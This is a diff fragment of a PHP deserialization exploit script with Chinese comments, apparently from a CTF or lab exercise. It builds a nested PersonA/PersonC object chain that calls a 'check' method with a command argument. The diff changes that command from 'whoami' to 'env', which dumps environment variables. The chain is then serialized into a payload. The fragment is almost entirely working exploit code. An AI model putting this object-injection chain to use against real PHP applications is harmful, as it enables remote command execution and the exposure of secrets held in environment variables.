@@ -38,7 +38,7 @@ $inner->age = new stdClass();  // 防止 __wakeup 报错
 $exploit = new PersonA();
 $exploit->name = $inner;  // PersonC 对象
 $exploit->id = "check";  // 要调用的方法名
-$exploit->age = "whoami";  // 命令参数 (可修改)
+$exploit->age = "env";  // 命令参数 (可修改)
 
 // === 生成 Payload ===
 $payload = serialize($exploit);
